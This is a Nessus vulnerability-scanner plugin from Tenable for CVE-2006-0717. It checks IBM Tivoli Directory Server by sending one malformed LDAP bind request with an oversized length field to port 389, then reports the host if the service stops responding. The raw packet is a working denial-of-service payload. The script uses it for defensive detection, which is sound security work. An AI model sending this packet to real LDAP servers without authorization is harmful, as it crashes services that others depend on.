#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20903);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2011/06/02 20:54:46 $");

  script_cve_id("CVE-2006-0717");
  script_bugtraq_id(16593);
  script_osvdb_id(23089);
 
  script_name(english:"IBM Tivoli Directory Server LDAP Packet Handling DoS");
  script_summary(english:"Checks for denial of service vulnerability in IBM Tivoli Directory Server");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote LDAP server is prone to denial of service attacks." );
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running IBM Tivoli Directory Server, an
LDAP directory from IBM. 

The version of IBM Tivoli Directory Server fails to handle certain
malformed search requests.  A user can leverage this issue to crash
the LDAP server." );
  script_set_attribute(attribute:"see_also", value:"http://lists.immunitysec.com/pipermail/dailydave/2006-February/002921.html" );
  script_set_attribute(attribute:"see_also", value:"http://www-1.ibm.com/support/docview.wss?uid=swg24011701" );
  script_set_attribute(attribute:"see_also", value:"http://www-1.ibm.com/support/docview.wss?uid=swg24014476" );
  script_set_attribute(attribute:"see_also", value:"http://www-1.ibm.com/support/docview.wss?uid=swg24011969" );
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate fix pack listed in the vendor support documents
referenced above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/14");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/11");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:tivoli_directory_server");
  script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc: "ldap", default: 389);


# A bad request.
req = raw_string(
  0x30,                                # universal sequence
  0x16,                                # length of the request
  0x02, 0x01, 0x01,                    # message id (1)
  0x60,                                # bind request
  0x12,                                #   length
  0x02,                                #   version
    0x01,                              #     length
    0x03,                              #     3
  0x04,                                #   DN
    0x84, 0xff, 0xff, 0xff, 0xff,      #     length
    "nessus",
  0x80, 0x00                           #   authentication (simple)
);


# Open a socket and send the request.
soc = open_sock_tcp(port);
if (! soc) exit(1);

  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  # If we didn't get anything back, check whether it crashed.
if (isnull(res))
{
    if (service_is_dead(port: port) > 0)
      security_warning(port);
      exit(0);
}

